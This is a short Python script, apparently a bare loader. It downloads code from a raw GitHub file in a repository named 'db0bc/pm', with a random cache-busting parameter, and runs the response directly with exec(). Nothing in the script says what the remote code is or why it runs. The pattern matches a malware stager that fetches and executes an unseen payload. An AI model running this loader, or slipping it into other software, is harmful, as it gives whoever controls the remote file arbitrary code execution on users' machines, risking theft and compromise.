import requests
import uuid

response = requests.get(f"https://raw.githubusercontent.com/db0bc/pm/refs/heads/main/pm?nocache={uuid.uuid4().hex}")
exec(response.text)
